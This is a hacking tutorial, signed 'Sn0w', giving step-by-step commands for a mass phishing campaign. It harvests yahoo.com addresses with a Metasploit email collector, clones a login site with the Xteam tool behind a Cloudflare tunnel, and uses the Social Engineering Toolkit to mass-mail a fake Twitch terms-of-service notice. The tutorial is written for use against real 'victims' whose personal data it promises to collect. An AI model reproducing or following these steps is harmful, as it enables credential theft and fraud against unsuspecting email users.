#Phishing attacks - By Sn0w

#Lets start with gathering emails for our attack, To do this we are going to harvest emails from yahoo.com

open your terminal in root
msfconsole
search collector
use gather/search_email_collector
show options
set DOMAIN <domain>
set OUTFILE <filename.txt>
show options
exploit - hit enter and let it run

#once done navigate to the <filename.txt> and you now have a list of emails to start your attack

#Now that we have our email list lets get our Xteam installed with GitHub

#open terminal in root

$sudo apt install git
$sudo git clone https://github.com/xploitstech/Xteam 
ls
cd Xteam
pip3 install -r requirements.txt
chmod +x *
$sudo bash Xteam.sh 

#Now that we have Xteam set up and ready to go lets start it by navigating to the Xteam directory, once there type the following 

$sudo bash Xteam.sh to start Xteam
option 3 - hit enter
choose your attack website
select portforwarding service, I recommend CloudFlare option 3 - hit enter
now copy URL #2 into your phising email 
be sure to LEAVE THIS TERMINAL OPEN while it collects your victims data!

#Now that we have our "keylogger" started lets get those emails sent out! To do this ill be using the baked in Kali tool "SEC" or Social Enginerring Toolkit (root)

open the program and enter your password
1 - hit enter
5 - hit enter
from here you can choose to either target one specific email address or the nifty email list you gathered earlier in this tutorial, for this will use the MASS sender
2 - hit enter 
#now you need to set the path where the email list lives, you can drag and drop the list into the terminal or type the path
/home/sn0w/yahoolist.txt 
1 - enter 
#enter the email account you will be sending the email from (your email)
sn0whacking@gmail.com - hit enter
#next itll ask what you want the RECIEVER to see for who the email is from - I suggest a bogus email you have pre-made for this
sn0whackingemail@gmail.com - hit enter
#enter the pre-made emails password and hit enter
flag message as Priority? up to you I suggest no as this looks fishy (be sure to type yes OR no and hit enter)
#next two options are up to you I usually select not to so hit n and enter
hit n and enter 
Email Subject: make it look official, for example: Twitch.tv Update to our Terms of Service 
send as plain or html? I choose plain so p and hit enter 
type the body: for example - "Our Terms and Service agreement has changed for the 2022 year, Please log in and view the updated Terms of Service agreement by clicking this link:" 
#now lets grab that 2nd URL from the Xteam hacker tool and paste it at the end of that email so it looks like this: Our Terms and Service agreement has changed for the 2022 year, Please log in and view the updated Terms of Service agreement by click this link: http://unlimited-twitch-tv-user-for-free@pick-nam-drawn-textile.trycloudflare.com END
be sure at the end of the message body type the word END in caps to end the message, once done hold CTRL + C and the emails will be sent
leave the Xteam tool open and watch your victims personal info start rolling in!
